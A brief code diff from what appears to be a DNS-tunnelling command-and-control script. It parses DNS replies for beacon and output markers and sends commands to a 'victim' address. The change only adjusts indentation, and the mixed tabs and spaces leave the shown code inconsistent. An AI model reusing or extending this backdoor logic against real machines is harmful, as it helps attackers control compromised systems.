@@ -56,8 +56,8 @@ def parse_packet(packet):
         print("print qname:")
         print(get_qname)   # class bytes
 	if get_an.startswith(BEACON):
-		data_recieved = get_qname[len(BEACON)]
-		send_command(victim_ip,vic_sport,get_qname,packet)
+	    data_recieved = get_qname[len(BEACON)]
+	    send_command(victim_ip,vic_sport,get_qname,packet)
 	
         elif get_an.startswith(BEGIN_OUTPUT):
             data_recieved = get_qname[len(BEGIN_OUTPUT)]	 
